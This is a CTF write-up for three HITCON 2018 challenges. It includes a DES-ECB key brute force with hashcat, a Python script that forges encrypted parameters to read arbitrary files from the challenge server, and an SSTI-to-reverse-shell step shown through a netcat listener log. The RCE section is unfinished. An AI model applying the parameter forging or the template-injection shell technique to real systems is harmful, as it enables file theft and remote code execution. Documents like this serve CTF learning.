# HITCON CTF 2018

## Problem

- On My Raddit - Web / Crypto / Feel?
- On My Raddit v2 - Web / 1-Day / RCE / SSTI
- ev3-basic - Forensics / Network / LEGO ev3

## On My Raddit

### Description

This is based on a real world case. If you get the crypto point, it can be sovled in 10 minutes!

### Exploit

The Problem Site looks like simple article page with board style.

It have some functions.

1. How much data to show - limit
2. If you click article, then redirect article's source page. - redirect
3. normal file download.

But, this functions are operated by s parameter.

Here is file download's s value.

>**Author :** Ghostbuster: Detecting the Presence of Hidden Eavesdroppers [pdf]
>
>**Filename :** 70c97cc1-079f-4d01-8798-f36925ec1fd7.pdf
>
>**s :** 2e7e305f2da018a2cf8208fa1fefc238522c932a276554e5f8085ba33f9600b301c3c95652a912b0342653ddcdc4703e5975bd2ff6cc8a133ca92540eb2d0a42
>
>
>
>**Author :** WEAPON SYSTEMS CYBERSECURITY: DOD Just Beginning to Grapple with Scale of Vulnerabilities (pdf)
>
>**Filename :** 09609b66-e193-42aa-bc2d-07542ca4442e.pdf
>
>**s :** 2e7e305f2da018a2cf8208fa1fefc238be24b0e6a4592fab1f8a22a342e43575e547d2499523d59754ba9923e44088052a5be3ba8bae2a943ca92540eb2d0a42

If you look at the s value above, It can be seen that only a few blocks are different in the middle.

Based on that, I guessed:

```
522c932a276554e5 f8085ba33f9600b3 01c3c95652a912b0 342653ddcdc4703e 5975bd2ff6cc8a13
 7 0 c 9 7 c c 1  - 0 7 9 f - 4 d  0 1 - 8 7 9 8 -  f 3 6 9 2 5 e c  1 f d 7 . p d f
be24b0e6a4592fab 1f8a22a342e43575 e547d2499523d597 54ba9923e4408805 2a5be3ba8bae2a94
 0 9 6 0 9 b 6 6  - e 1 9 3 - 4 2  a a - b c 2 d -  0 7 5 4 2 c a 4  4 4 2 e . p d f
```

I think that it is block cipher.

> Cipher = DES, DES3 and AES.
>
> Block size = 8 byte
>
> Block mode = ECB or OFB.

If Y have X, then that is OFB. ( X = plain1^plain2, Y = s1^s2 )

But it is not now, so I think ECB.

In the hint of the problem, I specified that Key is lowercase.

Therefore, i tried to 8byte brute force using hashcat, then i got a Key value.

```
$ ./hashcat -m 14000 f8085ba33f9600b3:2d303739662d3464 -a 3 '?l?l?l?l?l?l?l?l'
hashcat (v4.2.1-91-g99709a3) starting...

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1060 6GB, 1517/6069 MB allocatable, 10MCU

... ...

f8085ba33f9600b3:2d303739662d3464:ldgonaro

... ...
```

The key used to encrypt the DES-ECB was ldgonaro.

flag is hitcon{ldgonaro}? No.

It is not flag :( 

I tried to decrypt s value using simple decrypt python code.

```python
from Crypto.Cipher import DES

d = DES.new('ldgonaro',DES.MODE_ECB)

cipher = '2e7e305f2da018a2cf8208fa1fefc238be24b0e6a4592fab1f8a22a342e43575e547d2499523d59754ba9923e44088052a5be3ba8bae2a943ca92540eb2d0a42'.decode('hex')
print d.decrypt(cipher)
'''
$ python dec.py
m=d&f=uploads%2F09609b66-e193-42aa-bc2d-07542ca4442e.pdf\x08\x08\x08\x08\x08\x08\x08\x08
'''
```

I changed the f value to read app.py and got flag XD

```python
from Crypto.Cipher import DES
import requests
import readline

d = DES.new('ldgonaro',DES.MODE_ECB)

def padding(p):
	q = len(p)/8
	r = len(p)%8
	if r != 0:
		res = p[:q*8] + p[q*8:].ljust(8,chr(8-r))
	return res

while 1:
	inp = raw_input('path : ')
	plain = 'm=d&f=%s'%(inp)
	plain = padding(plain)
	s = d.encrypt(plain).encode('hex')

	try:
		r = requests.get('http://13.115.255.46/?s=%s'%(s))
		print r.text
	except:
		print '[*] Error Occured.'
'''
[ app.py ]
# coding: UTF-8
import os
import web
import urllib
import urlparse
from Crypto.Cipher import DES

web.config.debug = False
ENCRPYTION_KEY = 'megnnaro'

... ...

'''
```

**FLAG :** hitcon{megnnaro}

> Why is the key different?

## On My Raddit v2

### Description

Give me SHELL!!!

### Exploit

This is the same URL as the above problem.

I download `requirements.txt` using same python code because of I can't find vulnerability in app.py.

```
pycrypto==2.6.1
web.py==0.38
```

[ 작성중 ]

I tried to few query:

​	{{3\*3}},${3\*3} , ...

'${3\*3}'! It worked!

```
root@vultr:~# nc -lvp 10101
Listening on [0.0.0.0] (family 0, port 10101)
Connection from ec2-13-115-255-46.ap-northeast-1.compute.amazonaws.com 46028 received!
total 104
drwxr-xr-x  23 root root  4096 Oct 16 08:18 .
drwxr-xr-x  23 root root  4096 Oct 16 08:18 ..
drwxr-xr-x   2 root root  4096 Sep 12 15:59 bin
drwxr-xr-x   3 root root  4096 Oct 10 06:46 boot
drwxr-xr-x  15 root root  2980 Oct  8 18:13 dev
drwxr-xr-x  91 root root  4096 Oct 11 16:05 etc
-r--------   1 root root    47 Oct 16 08:15 flag
drwxr-xr-x   4 root root  4096 Oct 11 16:02 home
lrwxrwxrwx   1 root root    31 Oct 10 06:46 initrd.img -> boot/initrd.img-4.15.0-1023-aws
lrwxrwxrwx   1 root root    31 Sep 12 16:16 initrd.img.old -> boot/initrd.img-4.15.0-1021-aws
drwxr-xr-x  20 root root  4096 Oct 11 15:27 lib
drwxr-xr-x   2 root root  4096 Sep 12 15:56 lib64
drwx------   2 root root 16384 Sep 12 16:10 lost+found
drwxr-xr-x   2 root root  4096 Sep 12 15:55 media
drwxr-xr-x   2 root root  4096 Sep 12 15:55 mnt
drwxr-xr-x   2 root root  4096 Sep 12 15:55 opt
dr-xr-xr-x 123 root root     0 Oct  8 18:13 proc
-rwsr-sr-x   1 root root  8568 Oct 16 08:18 read_flag
drwx------   4 root root  4096 Oct 16 08:18 root
drwxr-xr-x  26 root root  1000 Oct 23 10:54 run
drwxr-xr-x   2 root root  4096 Oct 10 06:46 sbin
drwxr-xr-x   5 root root  4096 Oct  8 18:13 snap
drwxr-xr-x   2 root root  4096 Sep 12 15:55 srv
dr-xr-xr-x  13 root root     0 Oct 16 08:18 sys
drwxrwxrwt  12 root root  4096 Oct 23 11:03 tmp
drwxr-xr-x  10 root root  4096 Sep 12 15:55 usr
drwxr-xr-x  14 root root  4096 Oct 11 15:58 var
lrwxrwxrwx   1 root root    28 Oct 10 06:46 vmlinuz -> boot/vmlinuz-4.15.0-1023-aws
lrwxrwxrwx   1 root root    28 Sep 12 16:16 vmlinuz.old -> boot/vmlinuz-4.15.0-1021-aws
root@vultr:~# nc -lvp 10101
Listening on [0.0.0.0] (family 0, port 10101)
Connection from ec2-13-115-255-46.ap-northeast-1.compute.amazonaws.com 46042 received!
hitcon{Fr0m_SQL_Injecti0n_t0_Shell_1s_C00L!!!}
```

**FLAG :** hitcon{Fr0m_SQL_Injecti0n_t0_Shell_1s_C00L!!!}



## ev3-basic

### Description

Find the flag.

### Exploit

Simple packet analysis problem.

You can get a flag by looking at the **RFCOMM** packet.

It is python code to extracting flag.

```python
with open('ev3_basic.pklg','rb') as f:
	packet = f.read()

send_packets = packet.split('\x02\x0c\x20')
allow_len = ['\x1b','\x1c','\x1d']
p = ['\x81','\x82','\x83','\x84','\x85','\x00']
flag = []
for send_packet in send_packets[1:]:
	l = send_packet[0]
	if l in allow_len:
		q = send_packet[2:2+ord(l)]
		t = q.split('\x05\x01')[1]
		if t[0] in p:
			t = t[1:]
		t2 = t[2:]
		if t2[0] in p:
			t2 = t2[1:]
		flag.append((ord(t[0]),ord(t2[0]),q[-6]))
	else:
		continue

flag = sorted(flag,key=lambda f: (f[1],f[0]))
print ''.join(i[2] for i in flag)
```

**FLAG :** hitcon{m1nd5t0rm_communication_and_firmware_developer_kit}